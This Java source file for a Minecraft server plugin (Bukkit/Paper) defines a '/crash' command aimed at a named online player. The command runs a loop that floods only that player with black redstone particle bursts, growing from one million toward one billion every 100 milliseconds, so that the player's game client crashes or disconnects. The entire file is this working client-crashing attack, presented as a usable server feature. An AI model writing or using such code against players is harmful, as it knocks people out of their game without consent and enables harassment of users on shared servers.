package com.darko.main.utilities.crash;

import com.darko.main.Main;
import com.darko.main.other.Methods;
import com.destroystokyo.paper.ParticleBuilder;
import org.bukkit.Bukkit;
import org.bukkit.Particle;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.scheduler.BukkitRunnable;

public class Crash implements CommandExecutor {

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {

        if (!Main.getInstance().getConfig().getBoolean("FeatureToggles.CrashCommand")) return true;

        if (args.length == 0) {
            Methods.sendConfigMessage(sender, "Messages.CrashCommandInvalidUsage");
            return true;
        }

        Player player = Bukkit.getPlayer(args[0]);

        if (!Bukkit.getOnlinePlayers().contains(player)) {
            Methods.sendConfigMessage(sender, "Messages.CrashCommandOfflinePlayer");
            return true;
        }

        new BukkitRunnable() {
            @Override
            public void run() {

                Integer amountOfParticles = 1000000;

                while (player.isOnline()) {

                    ParticleBuilder particleBuilder = new ParticleBuilder(Particle.REDSTONE);
                    particleBuilder.receivers(player);
                    particleBuilder.count(amountOfParticles);
                    particleBuilder.location(player.getLocation().clone().subtract(0, 10, 0));
                    particleBuilder.color(0, 0, 0);

                    particleBuilder.spawn();

                    amountOfParticles += 1000000;

                    try {
                        Thread.sleep(100);
                    } catch (Throwable ignored) {
                    }

                    if(amountOfParticles >= 1000000000) break;

                }

            }
        }.runTaskAsynchronously(Main.getInstance());

        return true;

    }

}
